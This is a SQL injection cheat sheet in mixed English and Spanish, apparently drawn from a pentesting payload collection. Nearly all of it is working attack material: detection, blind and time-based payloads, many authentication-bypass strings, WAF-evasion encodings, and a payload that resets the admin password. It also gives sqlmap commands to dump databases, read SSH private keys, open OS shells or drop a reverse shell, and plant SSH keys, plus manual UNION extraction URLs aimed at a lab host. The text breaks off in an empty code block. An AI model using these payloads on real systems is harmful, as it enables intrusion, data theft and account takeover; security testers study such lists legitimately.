# SQL injection

A SQL injection attack consists of insertion or "injection" of a SQL query via the input data from the client to the application.

Attempting to manipulate SQL queries may have goals including:
- Information Leakage
- Disclosure of stored data
- Manipulation of stored data
- Bypassing authorization controls

## Tools

- sqlmap

## Summary

* [CheatSheet MSSQL Injection](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/SQL%20Injection/MSSQL%20Injection.md)
* [CheatSheet MySQL Injection](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/SQL%20Injection/MySQL%20Injection.md)
* [CheatSheet OracleSQL Injection](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/SQL%20Injection/OracleSQL%20Injection.md)
* [CheatSheet PostgreSQL Injection](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/SQL%20Injection/PostgreSQL%20Injection.md)
* [CheatSheet SQLite Injection](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/SQL%20Injection/SQLite%20Injection.md)
* [CheatSheet Cassandra Injection](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/SQL%20Injection/Cassandra%20Injection.md)
* [Entry point detection](#entry-point-detection)
* [Basic Detection](#basic-detection)
* [Blind Detection](#blind-detection)
* [Time-Based Detection](time-based-detection)
* [DBMS Identification](#dbms-identification)
* [SQL injection using SQLmap](#sql-injection-using-sqlmap)
  * [Basic arguments for SQLmap](#basic-arguments-for-sqlmap)
  * [Load a request file and use mobile user-agent](#load-a-request-file-and-use-mobile-user-agent)
  * [Custom injection in UserAgent/Header/Referer/Cookie](#custom-injection-in-useragentheaderreferercookie)
  * [Second order injection](#second-order-injection)
  * [Shell](#shell)
  * [Crawl a website with SQLmap and auto-exploit](#crawl-a-website-with-sqlmap-and-auto-exploit)
  * [Using TOR with SQLmap](#using-tor-with-sqlmap)
  * [Using a proxy with SQLmap](#using-a-proxy-with-sqlmap)
  * [Using Chrome cookie and a Proxy](#using-chrome-cookie-and-a-proxy)
  * [Using suffix to tamper the injection](#using-suffix-to-tamper-the-injection)
  * [General tamper option and tamper's list](#general-tamper-option-and-tampers-list)
  * [SQLmap without SQL injection](#sqlmap-without-sql-injection)
* [Authentication bypass](#authentication-bypass)
  * [Authentication Bypass (Raw MD5 SHA1)](#authentication-bypass-raw-md5-sha1)
* [Polyglot injection](#polyglot-injection-multicontext)
* [Routed injection](#routed-injection)
* [Insert Statement - ON DUPLICATE KEY UPDATE](#insert-statement---on-duplicate-key-update)
* [WAF Bypass](#waf-bypass)
* [Manual Exploitation](#manual-exploitation)

## Entry point detection

Detection of an SQL injection entry point
Simple characters

```sql
'
%27
"
%22
#
%23
;
%3B
)
Wildcard (*)
&apos;  # required for XML content
```

Multiple encoding

```sql
%%2727
%25%27
```

Merging characters

```sql
`+HERP
'||'DERP
'+'herp
' 'DERP
'%20'HERP
'%2B'HERP
```

Logic Testing

```sql
page.asp?id=1 or 1=1 -- true
page.asp?id=1' or 1=1 -- true
page.asp?id=1" or 1=1 -- true
page.asp?id=1 and 1=2 -- false
```

Weird characters

```sql
Unicode character U+02BA MODIFIER LETTER DOUBLE PRIME (encoded as %CA%BA) was
transformed into U+0022 QUOTATION MARK (")
Unicode character U+02B9 MODIFIER LETTER PRIME (encoded as %CA%B9) was
transformed into U+0027 APOSTROPHE (')
```

## Basic Detection

- [ ] **Inyección en Domain**

```
https://domain.com/%2527
```
```
https://domain.com/%27
```
```
https://domain.com/'
```

- [ ] **E-mail address payloads SQLi**

You can use this in any field of "e-mail". (recover your password, for example)

```
a@a.com
"a"@.com
test example@test.com
"test example"@test.com
asd@a.com
asd a@a.com
\"asd a\"@a.com
asd(a)@a.com
\"asd(a)\"@a.com
asd'a@a.com
asd'or'1'='1@a.com
a'-IF(LENGTH(database())>9,SLEEP(8),0)or'1'='1@a.com
a'AND%20SLEEP(8)%20or'1'='1@a.com
\"a'-IF(LENGTH(database())>9,SLEEP(8),0)or'1'='1\@a.com
"' OR 1=1 -- '"@example.com
```

- [ ] Testear comillas SIMPLES para detectar errores 500

```
param=' (500 Error)
param='' (200 OK)
```

Luego verificar que efectivamente se trata de un error SQL y no otro tipo de error.

```
Cookie: parametro=xyz'||(SELECT '')||' (500)
Cookie: parametro=xyz'||(SELECT '' FROM dual)||' (200) (ORACLE DB)
```

- [ ] **Inyección en "Host", "User-Agent", "Referer", "Location" and "Cookie"**

```
Host: example.com'
Referer: example.com"
User-Agent: <user-agent>\
Cookie: my_cookie:123\
Cookie: my_cookie:123'
Cookie: my_cookie:123"
```

- [ ] **Content-Length**

```
Content-Length: '%20or%201%3d1%2d%2d (' or 1=1 --) (200 OK)
Content-Length: <parteOK>%20or%201%3d01 ( or 1=1 --) (200 OK)
Content-Length: <parteOK>'%20or%201%3d01 (' or 1=1 --) (200 OK)
```
```
Content-Length: '%20or%201%3d2%2d%2d (' or 1=2 --) (40X)
Content-Length: <parteOK>%20or%201%3d2%2d%2d  ( or 1=2 --) (40X)
Content-Length: <parteOK>'%20or%201%3d2%2d%2d  (' or 1=2 --) (40X)
```
```
';SELECT pg_sleep(10);-- (testear TimeBased en Postgres)
'%3bSELECT%20pg_sleep(10);%20-- (testear TimeBased en Postgres)
```

- [ ] **Recuperar Datos Ocultos**

Si ambas consultas dan resultados distintos:

```
https://insecure-website.com/products?category=Gifts
https://insecure-website.com/products?category=Gifts'--
```

Debe probar lo siguiente para que la aplicación muestre todos los productos en cualquier categoría, incluidas las categorías que no conoce:

```
https://insecure-website.com/products?category=Gifts'+OR+1=1--
```

La consulta modificada devolverá todos los elementos en los que la categoría sea "Gifts" o "1=1". Dado que "1=1" siempre es verdadero, la consulta devolverá todos los elementos.


## Blind Detection

La aplicación se comporta de manera distinta cuando las condiciones son verdaderas o falsas.

Inyectar en los parámetros de la "cookie":

```
Cookie: TrackingId=u5YD3PapBcR4lN3e7Tj4' AND '1'='1
```
```
Cookie: TrackingId=u5YD3PapBcR4lN3e7Tj4' AND '1'='2
```

El primero de estos valores hará que la consulta devuelva resultados, porquela condición inyectada es verdadera.

El segundo valor hará que la consulta no devuelva ningún resultado, o devuelva distintos resultados, porque la condición inyectada es falsa. 

- [ ] **Errores Condicionales (Blind SQLi)**

Intentar:

```
Cookie: TrackingId=u5YD3PapBcR4lN3e7Tj4'  --> Error 40X
Cookie: TrackingId=u5YD3PapBcR4lN3e7Tj4'' --> 200 OK
```
Luego debe confirmar que el servidor interpreta la consulta como SQL, en lugar de cualquier otro tipo de error. Las siguientes consultas varían de la DB en el backend, una de ellas debería ser VERDADERA para confirmar una posible SQLi:

```
Cookie: TrackingId=u5YD3PapBcR4lN3e7Tj4'||(SELECT '')||'
```
```
Cookie: TrackingId=u5YD3PapBcR4lN3e7Tj4'||(SELECT '' FROM dual)||' (Oracle)
```

Cuando la inyección de diferentes condiciones booleanas no hace ninguna diferencia en las respuestas de la aplicación, en esta situación, es posible inducir a la aplicación a devolver respuestas condicionales desencadenando errores de SQL de forma condicional, dependiendo de una condición inyectada.

```
Cookie: TrackingId=u5YD3PapBcR4lN3e7Tj4' AND (SELECT CASE WHEN (1=2) THEN 1/0 ELSE 'a' END)='a
```
```
Cookie: TrackingId=u5YD3PapBcR4lN3e7Tj4' AND (SELECT CASE WHEN (1=1) THEN 1/0 ELSE 'a' END)='a
```

Primera entrada, se evalúa 'a', lo que no causa ningún error. 

Segunda entrada, se evalúa a 1/0, lo que provoca un error de división por cero. 

Suponiendo que el error causa alguna diferencia en la respuesta HTTP de la aplicación, podemos usar esta diferencia para inferir si la condición inyectada es verdadera.

**Oracle:**
```
' AND (SELECT CASE WHEN (1=2) THEN to_char(1/0) ELSE NULL END FROM dual)--
```
```
' AND (SELECT CASE WHEN (1=1) THEN to_char(1/0) ELSE NULL END FROM dual)--
```

**Microsoft SQL Server:**
```
' AND (SELECT CASE WHEN (1=2) THEN 1/0 ELSE NULL END)--

```
```
' AND (SELECT CASE WHEN (1=1) THEN 1/0 ELSE NULL END)--
```

**PostgreSQL:**
```
' AND (SELECT CASE WHEN (1=2) THEN cast(1/0 as text) ELSE NULL END)--

```
```
' AND (SELECT CASE WHEN (1=1) THEN cast(1/0 as text) ELSE NULL END)--
```

**MySQL:**
```
' AND (SELECT IF(1=2,(SELECT table_name FROM information_schema.tables),'a'))--

```
```
' AND (SELECT IF(1=1,(SELECT table_name FROM information_schema.tables),'a'))--%20
```

## Time-Based Detection

La aplicación detecta errores de la base de datos y los maneja correctamente. Activar un error de base de datos cuando se ejecuta la consulta SQL inyectada no causa ninguna diferencia en la respuesta de la aplicación, por lo que la técnica anterior de inducir errores condicionales no funcionará.

Se debe explotar SQL ciega activando retrasos de tiempo condicionalmente, dependiendo de una condición inyectada.

Las técnicas para activar un retraso de tiempo son muy específicas del tipo de base de datos que se utiliza:

**Oracle:**
```
'; dbms_pipe.receive_message(('a'),10)--
') dbms_pipe.receive_message(('a'),10)--
'); dbms_pipe.receive_message(('a'),10)--
';) dbms_pipe.receive_message(('a'),10)--
```

**Microsoft SQL Server:**
```
'; IF (1=2) WAITFOR DELAY '0:0:10'--
'; IF (1=1) WAITFOR DELAY '0:0:10'--
') IF (1=2) WAITFOR DELAY '0:0:10'--
') IF (1=1) WAITFOR DELAY '0:0:10'--
'); IF (1=2) WAITFOR DELAY '0:0:10'--
'); IF (1=1) WAITFOR DELAY '0:0:10'--
';) IF (1=2) WAITFOR DELAY '0:0:10'--
';) IF (1=1) WAITFOR DELAY '0:0:10'--
'; WAITFOR DELAY '0:0:10'--
'; WAITFOR DELAY '0:0:10'--
') WAITFOR DELAY '0:0:10'--
') WAITFOR DELAY '0:0:10'--
'); WAITFOR DELAY '0:0:10'--
'); WAITFOR DELAY '0:0:10'--
';) WAITFOR DELAY '0:0:10'--
';) WAITFOR DELAY '0:0:10'--
```


**PostgreSQL:**
```
'; SELECT pg_sleep(10)--
') SELECT pg_sleep(10)--
'); dbms_pipe.receive_message(('a'),10)--
';) dbms_pipe.receive_message(('a'),10)--
```

**MySQL:**
```
'; SELECT sleep(10)--%20
') SELECT sleep(10)--%20
'); SELECT sleep(10)--%20
';) SELECT sleep(10)--%20
```


## DBMS Identification

```c
["conv('a',16,2)=conv('a',16,2)"                   ,"MYSQL"],
["connection_id()=connection_id()"                 ,"MYSQL"],
["crc32('MySQL')=crc32('MySQL')"                   ,"MYSQL"],
["BINARY_CHECKSUM(123)=BINARY_CHECKSUM(123)"       ,"MSSQL"],
["@@CONNECTIONS>0"                                 ,"MSSQL"],
["@@CONNECTIONS=@@CONNECTIONS"                     ,"MSSQL"],
["@@CPU_BUSY=@@CPU_BUSY"                           ,"MSSQL"],
["USER_ID(1)=USER_ID(1)"                           ,"MSSQL"],
["ROWNUM=ROWNUM"                                   ,"ORACLE"],
["RAWTOHEX('AB')=RAWTOHEX('AB')"                   ,"ORACLE"],
["LNNVL(0=123)"                                    ,"ORACLE"],
["5::int=5"                                        ,"POSTGRESQL"],
["5::integer=5"                                    ,"POSTGRESQL"],
["pg_client_encoding()=pg_client_encoding()"       ,"POSTGRESQL"],
["get_current_ts_config()=get_current_ts_config()" ,"POSTGRESQL"],
["quote_literal(42.5)=quote_literal(42.5)"         ,"POSTGRESQL"],
["current_database()=current_database()"           ,"POSTGRESQL"],
["sqlite_version()=sqlite_version()"               ,"SQLITE"],
["last_insert_rowid()>1"                           ,"SQLITE"],
["last_insert_rowid()=last_insert_rowid()"         ,"SQLITE"],
["val(cvar(1))=1"                                  ,"MSACCESS"],
["IIF(ATN(2)>0,1,0) BETWEEN 2 AND 0"               ,"MSACCESS"],
["cdbl(1)=cdbl(1)"                                 ,"MSACCESS"],
["1337=1337",   "MSACCESS,SQLITE,POSTGRESQL,ORACLE,MSSQL,MYSQL"],
["'i'='i'",     "MSACCESS,SQLITE,POSTGRESQL,ORACLE,MSSQL,MYSQL"],
```

## SQL injection using SQLmap

### Basic arguments for SQLmap

```powershell
sqlmap --url="<url>" -p username --user-agent=SQLMAP --random-agent --threads=10 --risk=3 --level=5 --eta --dbms=MySQL --os=Linux --banner --is-dba --users --passwords --current-user --dbs
```

Testing a parameter with GET (mark with a "*" the parameter to test)

```powershell
sqlmap.py -u "http://example.com/main.php?id=1*" --batch --banner
```
```powershell
sqlmap.py -u "http://example.com/main.php?id=1*" --batch --banner --dbs
```

More Basic Injection 01

```powershell
sqlmap -r <requestPOST>.txt 
```

More Basic Injection 02

```powershell
sqlmap -r req01.txt --dbs 
```

Basic Enumeration

```powershell
sqlmap -r <requestPOST>.txt --risk=3 --level=5 --threads=10 
```

Get All Tables

```powershell
sqlmap -r <requestPOST>.txt --risk=3 --level=5 --tables 
```

Get Tables of a DB

```powershell
sqlmap -r <requestGET>.txt --risk=3 --level=5 -D <database> --tables --threads=10 
```

Get Columns of a Table of a DB

```powershell
sqlmap -r <requestPOST>.txt --risk=3 --level=5 -D <database> -T <tableName> --columns --threads 10 
```

Get ALL DATA of a Column

```powershell
sqlmap -r <requestGET>.txt --risk=3 --level=5 -D <database> -T <table_name> -C <column_name> --dump --threads=10 
```

Read a File of System if you have permissions

```powershell
sqlmap -r <requestPOST>.txt --file-read /home/dorthi/.ssh/id_rsa
```

User-Agent Bypass

```powershell
sqlmap -u 'http://10.10.10.143/room.php?cod=1' --user-agent "<your_user_agent>"
```

### Load a request file and use mobile user-agent

```powershell
sqlmap -r sqli.req --safe-url=http://10.10.10.10/ --mobile --safe-freq=1
```

### Custom injection in UserAgent/Header/Referer/Cookie

```powershell
python sqlmap.py -u "http://example.com" --data "username=admin&password=pass"  --headers="x-forwarded-for:127.0.0.1*"
The injection is located at the '*'
```

### Second order injection

```powershell
python sqlmap.py -r /tmp/r.txt --dbms MySQL --second-order "http://targetapp/wishlist" -v 3
sqlmap -r 1.txt -dbms MySQL -second-order "http://<IP/domain>/joomla/administrator/index.php" -D "joomla" -dbs
```

### Shell

```powershell
SQL Shell
python sqlmap.py -u "http://example.com/?id=1"  -p id --sql-shell

Simple Shell
python sqlmap.py -u "http://example.com/?id=1"  -p id --os-shell

Dropping a reverse-shell / meterpreter
python sqlmap.py -u "http://example.com/?id=1"  -p id --os-pwn

SSH Shell by dropping an SSH key
python sqlmap.py -u "http://example.com/?id=1" -p id --file-write=/root/.ssh/id_rsa.pub --file-destination=/home/user/.ssh/
```

### Crawl a website with SQLmap and auto-exploit

```powershell
sqlmap -u "http://example.com/" --crawl=1 --random-agent --batch --forms --threads=5 --level=5 --risk=3

--batch = non interactive mode, usually Sqlmap will ask you questions, this accepts the default answers
--crawl = how deep you want to crawl a site
--forms = Parse and test forms
```

### Using TOR with SQLmap

```powershell
sqlmap -u "http://www.target.com" --tor --tor-type=SOCKS5 --time-sec 11 --check-tor --level=5 --risk=3 --threads=5
```

### Using a proxy with SQLmap

```powershell
sqlmap -u "http://www.target.com" --proxy="http://127.0.0.1:8080"
```

### Using Chrome cookie and a Proxy

```powershell
sqlmap -u "https://test.com/index.php?id=99" --load-cookie=/media/truecrypt1/TI/cookie.txt --proxy "http://127.0.0.1:8080"  -f  --time-sec 15 --level 3
```

### Using suffix to tamper the injection

```powershell
python sqlmap.py -u "http://example.com/?id=1"  -p id --suffix="-- "
```


### General tamper option and tamper's list

```powershell
tamper=name_of_the_tamper
```

| Tamper | Description |
| --- | --- |
|0x2char.py | Replaces each (MySQL) 0x<hex> encoded string with equivalent CONCAT(CHAR(),…) counterpart |
|apostrophemask.py | Replaces apostrophe character with its UTF-8 full width counterpart |
|apostrophenullencode.py | Replaces apostrophe character with its illegal double unicode counterpart|
|appendnullbyte.py | Appends encoded NULL byte character at the end of payload |
|base64encode.py | Base64 all characters in a given payload  |
|between.py | Replaces greater than operator ('>') with 'NOT BETWEEN 0 AND #' |
|bluecoat.py | Replaces space character after SQL statement with a valid random blank character.Afterwards replace character = with LIKE operator  |
|chardoubleencode.py | Double url-encodes all characters in a given payload (not processing already encoded) |
|charencode.py | URL-encodes all characters in a given payload (not processing already encoded) (e.g. SELECT -> %53%45%4C%45%43%54) |
|charunicodeencode.py | Unicode-URL-encodes all characters in a given payload (not processing already encoded) (e.g. SELECT -> %u0053%u0045%u004C%u0045%u0043%u0054) |
|charunicodeescape.py | Unicode-escapes non-encoded characters in a given payload (not processing already encoded) (e.g. SELECT -> \u0053\u0045\u004C\u0045\u0043\u0054) |
|commalesslimit.py | Replaces instances like 'LIMIT M, N' with 'LIMIT N OFFSET M'|
|commalessmid.py | Replaces instances like 'MID(A, B, C)' with 'MID(A FROM B FOR C)'|
|commentbeforeparentheses.py | Prepends (inline) comment before parentheses (e.g. ( -> /**/() |
|concat2concatws.py | Replaces instances like 'CONCAT(A, B)' with 'CONCAT_WS(MID(CHAR(0), 0, 0), A, B)'|
|charencode.py | Url-encodes all characters in a given payload (not processing already encoded)  |
|charunicodeencode.py | Unicode-url-encodes non-encoded characters in a given payload (not processing already encoded)  |
|equaltolike.py | Replaces all occurrences of operator equal ('=') with operator 'LIKE'  |
|escapequotes.py | Slash escape quotes (' and ") |
|greatest.py | Replaces greater than operator ('>') with 'GREATEST' counterpart |
|halfversionedmorekeywords.py | Adds versioned MySQL comment before each keyword  |
|htmlencode.py | HTML encode (using code points) all non-alphanumeric characters (e.g. ‘ -> &#39;) |
|ifnull2casewhenisnull.py | Replaces instances like ‘IFNULL(A, B)’ with ‘CASE WHEN ISNULL(A) THEN (B) ELSE (A) END’ counterpart| 
|ifnull2ifisnull.py | Replaces instances like 'IFNULL(A, B)' with 'IF(ISNULL(A), B, A)'|
|informationschemacomment.py | Add an inline comment (/**/) to the end of all occurrences of (MySQL) “information_schema” identifier |
|least.py | Replaces greater than operator (‘>’) with ‘LEAST’ counterpart |
|lowercase.py | Replaces each keyword character with lower case value (e.g. SELECT -> select) |
|modsecurityversioned.py | Embraces complete query with versioned comment |
|modsecurityzeroversioned.py | Embraces complete query with zero-versioned comment |
|multiplespaces.py | Adds multiple spaces around SQL keywords |
|nonrecursivereplacement.py | Replaces predefined SQL keywords with representations suitable for replacement (e.g. .replace("SELECT", "")) filters|
|overlongutf8.py | Converts all characters in a given payload (not processing already encoded) |
|overlongutf8more.py | Converts all characters in a given payload to overlong UTF8 (not processing already encoded) (e.g. SELECT -> %C1%93%C1%85%C1%8C%C1%85%C1%83%C1%94) |
|percentage.py | Adds a percentage sign ('%') infront of each character  |
|plus2concat.py | Replaces plus operator (‘+’) with (MsSQL) function CONCAT() counterpart |
|plus2fnconcat.py | Replaces plus operator (‘+’) with (MsSQL) ODBC function {fn CONCAT()} counterpart |
|randomcase.py | Replaces each keyword character with random case value |
|randomcomments.py | Add random comments to SQL keywords|
|securesphere.py | Appends special crafted string |
|sp_password.py |  Appends 'sp_password' to the end of the payload for automatic obfuscation from DBMS logs |
|space2comment.py | Replaces space character (' ') with comments |
|space2dash.py | Replaces space character (' ') with a dash comment ('--') followed by a random string and a new line ('\n') |
|space2hash.py | Replaces space character (' ') with a pound character ('#') followed by a random string and a new line ('\n') |
|space2morehash.py | Replaces space character (' ') with a pound character ('#') followed by a random string and a new line ('\n') |
|space2mssqlblank.py | Replaces space character (' ') with a random blank character from a valid set of alternate characters |
|space2mssqlhash.py | Replaces space character (' ') with a pound character ('#') followed by a new line ('\n') |
|space2mysqlblank.py | Replaces space character (' ') with a random blank character from a valid set of alternate characters |
|space2mysqldash.py | Replaces space character (' ') with a dash comment ('--') followed by a new line ('\n') |
|space2plus.py |  Replaces space character (' ') with plus ('+')  |
|space2randomblank.py | Replaces space character (' ') with a random blank character from a valid set of alternate characters |
|symboliclogical.py | Replaces AND and OR logical operators with their symbolic counterparts (&& and ||) |
|unionalltounion.py | Replaces UNION ALL SELECT with UNION SELECT |
|unmagicquotes.py | Replaces quote character (') with a multi-byte combo %bf%27 together with generic comment at the end (to make it work) |
|uppercase.py | Replaces each keyword character with upper case value 'INSERT'|
|varnish.py | Append a HTTP header 'X-originating-IP' |
|versionedkeywords.py | Encloses each non-function keyword with versioned MySQL comment |
|versionedmorekeywords.py | Encloses each keyword with versioned MySQL comment |
|xforwardedfor.py | Append a fake HTTP header 'X-Forwarded-For'|

### SQLmap without SQL injection

You can use SQLmap to access a database via its port instead of a URL.

```ps1
sqlmap.py -d "mysql://user:pass@ip/database" --dump-all 
```

## Authentication bypass

```sql
'-'
' '
'&'
'^'
'*'
' or 1=1 limit 1 -- -+
'="or'
' or ''-'
' or '' '
' or ''&'
' or ''^'
' or ''*'
'-||0'
"-||0"
"-"
" "
"&"
"^"
"*"
'--'
"--"
'--' / "--"
" or ""-"
" or "" "
" or ""&"
" or ""^"
" or ""*"
or true--
" or true--
' or true--
") or true--
') or true--
' or 'x'='x
') or ('x')=('x
')) or (('x'))=(('x
" or "x"="x
") or ("x")=("x
")) or (("x"))=(("x
or 2 like 2
or 1=1
or 1=1--
or 1=1#
or 1=1/*
admin' --
admin' -- -
admin' #
admin'/*
admin' or '2' LIKE '1
admin' or 2 LIKE 2--
admin' or 2 LIKE 2#
admin') or 2 LIKE 2#
admin') or 2 LIKE 2--
admin') or ('2' LIKE '2
admin') or ('2' LIKE '2'#
admin') or ('2' LIKE '2'/*
admin' or '1'='1
admin' or '1'='1'--
admin' or '1'='1'#
admin' or '1'='1'/*
admin'or 1=1 or ''='
admin' or 1=1
admin' or 1=1--
admin' or 1=1#
admin' or 1=1/*
admin') or ('1'='1
admin') or ('1'='1'--
admin') or ('1'='1'#
admin') or ('1'='1'/*
admin') or '1'='1
admin') or '1'='1'--
admin') or '1'='1'#
admin') or '1'='1'/*
1234 ' AND 1=0 UNION ALL SELECT 'admin', '81dc9bdb52d04dc20036dbd8313ed055
admin" --
admin';-- azer 
admin" #
admin"/*
admin" or "1"="1
admin" or "1"="1"--
admin" or "1"="1"#
admin" or "1"="1"/*
admin"or 1=1 or ""="
admin" or 1=1
admin" or 1=1--
admin" or 1=1#
admin" or 1=1/*
admin") or ("1"="1
admin") or ("1"="1"--
admin") or ("1"="1"#
admin") or ("1"="1"/*
admin") or "1"="1
admin") or "1"="1"--
admin") or "1"="1"#
admin") or "1"="1"/*
1234 " AND 1=0 UNION ALL SELECT "admin", "81dc9bdb52d04dc20036dbd8313ed055
administrator'--
OR 1=1 --
' OR 2=2 --
") OR 1=1 --
') OR 1=1 --
admin==
administrator==
admin'-
'or''='
' or 1=1 LIMIT 1 --
' or 1=1 LIMIT 1 -- -
' or 1=1 LIMIT 1#
'or 1#
' or 1=1 --
' or 1=1 -- -
' or 1=1#
" OR "1"="1
```

## Authentication Bypass (Raw MD5 SHA1)

When a raw md5 is used, the pass will be queried as a simple string, not a hexstring.

```php
"SELECT * FROM admin WHERE pass = '".md5($password,true)."'"
```

Allowing an attacker to craft a string with a `true` statement such as `' or 'SOMETHING`

```php
md5("ffifdyop", true) = 'or'6�]��!r,��b
sha1("3fDf ", true) = Q�u'='�@�[�t�- o��_-!
```

Challenge demo available at [http://web.jarvisoj.com:32772](http://web.jarvisoj.com:32772)

## Polyglot injection (multicontext)

```sql
SLEEP(1) /*' or SLEEP(1) or '" or SLEEP(1) or "*/

/* MySQL only */
IF(SUBSTR(@@version,1,1)<5,BENCHMARK(2000000,SHA1(0xDE7EC71F1)),SLEEP(1))/*'XOR(IF(SUBSTR(@@version,1,1)<5,BENCHMARK(2000000,SHA1(0xDE7EC71F1)),SLEEP(1)))OR'|"XOR(IF(SUBSTR(@@version,1,1)<5,BENCHMARK(2000000,SHA1(0xDE7EC71F1)),SLEEP(1)))OR"*/
```

## Routed injection

```sql
admin' AND 1=0 UNION ALL SELECT 'admin', '81dc9bdb52d04dc20036dbd8313ed055'
```

## Insert Statement - ON DUPLICATE KEY UPDATE

ON DUPLICATE KEY UPDATE keywords is used to tell MySQL what to do when the application tries to insert a row that already exists in the table. We can use this to change the admin password by:

```sql
Inject using payload:
  attacker_dummy@example.com", "bcrypt_hash_of_qwerty"), ("admin@example.com", "bcrypt_hash_of_qwerty") ON DUPLICATE KEY UPDATE password="bcrypt_hash_of_qwerty" --

The query would look like this:
INSERT INTO users (email, password) VALUES ("attacker_dummy@example.com", "bcrypt_hash_of_qwerty"), ("admin@example.com", "bcrypt_hash_of_qwerty") ON DUPLICATE KEY UPDATE password="bcrypt_hash_of_qwerty" -- ", "bcrypt_hash_of_your_password_input");

This query will insert a row for the user “attacker_dummy@example.com”. It will also insert a row for the user “admin@example.com”.
Because this row already exists, the ON DUPLICATE KEY UPDATE keyword tells MySQL to update the `password` column of the already existing row to "bcrypt_hash_of_qwerty".

After this, we can simply authenticate with “admin@example.com” and the password “qwerty”!
```

## WAF Bypass

No Space (%20) - bypass using whitespace alternatives

```sql
?id=1%09and%091=1%09--
?id=1%0Dand%0D1=1%0D--
?id=1%0Cand%0C1=1%0C--
?id=1%0Band%0B1=1%0B--
?id=1%0Aand%0A1=1%0A--
?id=1%A0and%A01=1%A0--
```

No Whitespace - bypass using comments

```sql
?id=1/*comment*/and/**/1=1/**/--
```

No Whitespace - bypass using parenthesis

```sql
?id=(1)and(1)=(1)--
```

No Comma - bypass using OFFSET, FROM and JOIN

```sql
LIMIT 0,1         -> LIMIT 1 OFFSET 0
SUBSTR('SQL',1,1) -> SUBSTR('SQL' FROM 1 FOR 1).
SELECT 1,2,3,4    -> UNION SELECT * FROM (SELECT 1)a JOIN (SELECT 2)b JOIN (SELECT 3)c JOIN (SELECT 4)d
```

No Equal - bypass using LIKE/NOT IN/IN/BETWEEN

```sql
?id=1 and substring(version(),1,1)like(5)
?id=1 and substring(version(),1,1)not in(4,3)
?id=1 and substring(version(),1,1)in(4,3)
?id=1 and substring(version(),1,1) between 3 and 4
```

Blacklist using keywords - bypass using uppercase/lowercase

```sql
?id=1 AND 1=1#
?id=1 AnD 1=1#
?id=1 aNd 1=1#
```

Blacklist using keywords case insensitive - bypass using an equivalent operator

```sql
AND   -> &&
OR    -> ||
=     -> LIKE,REGEXP, BETWEEN, not < and not >
> X   -> not between 0 and X
WHERE -> HAVING
```

Information_schema.tables Alternative

```sql
select * from mysql.innodb_table_stats;
+----------------+-----------------------+---------------------+--------+----------------------+--------------------------+
| database_name  | table_name            | last_update         | n_rows | clustered_index_size | sum_of_other_index_sizes |
+----------------+-----------------------+---------------------+--------+----------------------+--------------------------+
| dvwa           | guestbook             | 2017-01-19 21:02:57 |      0 |                    1 |                        0 |
| dvwa           | users                 | 2017-01-19 21:03:07 |      5 |                    1 |                        0 |
...
+----------------+-----------------------+---------------------+--------+----------------------+--------------------------+

mysql> show tables in dvwa;
+----------------+
| Tables_in_dvwa |
+----------------+
| guestbook      |
| users          |
+----------------+
```

Version Alternative

```sql
mysql> select @@innodb_version;
+------------------+
| @@innodb_version |
+------------------+
| 5.6.31           |
+------------------+

mysql> select @@version;
+-------------------------+
| @@version               |
+-------------------------+
| 5.6.31-0ubuntu0.15.10.1 |
+-------------------------+

mysql> mysql> select version();
+-------------------------+
| version()               |
+-------------------------+
| 5.6.31-0ubuntu0.15.10.1 |
+-------------------------+
```

## Manual Exploitation

### Version

```powershell
http://10.10.10.143/room.php?cod=0+union+select+1,2,version(),4,5,6,7--
```

### DB username

```powershell
http://10.10.10.143/room.php?cod=-1+union+select+1,2,user(),4,5,6,7--
```

### DB name

```powershell
http://10.10.10.143/room.php?cod=0+union+select+1,2,database(),4,5,6,7--
```

### See ALL DBs

1. First Method
 
```powershell
http://10.10.10.143/room.php?cod=0+union+select+1,2,(select+group_concat(schema_name,":")+from+information_schema.schemata),4,5,6,7--
```

2. Second Method

```powershell
http://10.10.10.143/room.php?cod=0+union+select+1,2,(select+group_concat(schema_name,":")+from+information_schema.schemata),4,5,6,7--
```

```powershell
http://10.10.10.143/room.php?cod=0+union+select+1,2,schema_name,4,5,6,7+from+information_schema.schemata limit 0,1--
```

```powershell
http://10.10.10.143/room.php?cod=0+union+select+1,2,schema_name,4,5,6,7+from+information_schema.schemata limit 1,1--
```

```powershell
http://10.10.10.143/room.php?cod=0+union+select+1,2,schema_name,4,5,6,7+from+information_schema.schemata limit 2,1--
```

```powershell
http://10.10.10.143/room.php?cod=0+union+select+1,2,schema_name,4,5,6,7+from+information_schema.schemata limit 3,1--
```

```powershell
...
...
...
```

```powershell
http://10.10.10.143/room.php?cod=0+union+select+1,2,schema_name,4,5,6,7+from+information_schema.schemata limit <n>,1--
```

### Tables of current DB

```powershell
http://10.10.10.143/room.php?cod=0+union+select+1,2,(SELECT+group_concat(table_name)+from+information_schema.tables+where+table_schema=database()),4,5,6,7--
```

### Tables one by one of current DB

```powershell
http://10.10.10.143/room.php?cod=0+union+select+1,2,table_name,4,5,6,7+from+information_schema.tables+where+table_schema=database()+limit+0,1--+
```

```powershell
http://10.10.10.143/room.php?cod=0+union+select+1,2,table_name,4,5,6,7+from+information_schema.tables+where+table_schema=database()+limit+1,1--+
```

```powershell
http://10.10.10.143/room.php?cod=0+union+select+1,2,table_name,4,5,6,7+from+information_schema.tables+where+table_schema=database()+limit+2,1--+
```

```powershell
http://10.10.10.143/room.php?cod=0+union+select+1,2,table_name,4,5,6,7+from+information_schema.tables+where+table_schema=database()+limit+3,1--+
```

### See ALL Tables of a DB

```powershell
http://10.10.10.143/room.php?cod=-1+union+select+1,2,(SELECT+group_concat(TABLE_NAME,":",COLUMN_NAME,"\r\n")+from+Information_Schema.COLUMNS+where+TABLE_SCHEMA+=+'<DB_NAME>'),4,5,6,7--
```

### Get the names of Columns under your Table

```powershell
http://10.10.10.143/room.php?cod=0+union+select+1,2,column_name,4,5,6,7+from+information_schema.columns+where+table_schema=database()+and+table_name='tablenamehere'--+
```

```powershell
http://10.10.10.143/room.php?cod=0+union+select+1,2,column_name,4,5,6,7+from+information_schema.columns+where+table_schema=database()+and+table_name='tablenamehere'+limit+0,1--+
```

```powershell
